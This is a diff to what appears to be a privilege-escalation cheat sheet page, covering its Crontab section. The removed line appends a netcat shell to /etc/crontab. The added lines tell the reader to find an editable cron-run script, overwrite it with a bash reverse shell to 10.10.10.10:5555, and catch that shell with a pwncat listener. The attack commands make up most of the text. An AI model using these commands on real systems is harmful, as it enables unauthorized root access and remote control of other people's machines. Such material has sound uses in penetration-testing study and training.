@@ -258,9 +258,29 @@ Run
 
 <h2>Crontab</h2>
 
-Add to crontab to get root after 1 min 
+Check if you can view crontab :
 
-<b>hacked-account@victim~: </b><code>echo ' *  *  *  *  * /usr/bin/nc -c /bin/bash' >> /etc/crontab</code>
+<b>hacked-account@victim~: </b><code>cat /etc/crontab</code>
+
+Do you see a script that is running that your user have premision to edit? If you do, replace the content with a bash reverse-shell:
+
+<code>
+
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.10.10.10/5555 0>&1
+
+</code>
+
+First start listner
+
+<b>pform@attacker~: </b><code>pwncat -l -p 5555</code>
+ 
+Then you have to wait for the time as the script it setup to run at.
+
+If you dont know how the time for crontab works, use the link below to find out.
+
+<li>https://crontab.guru/</li>
 
 
 
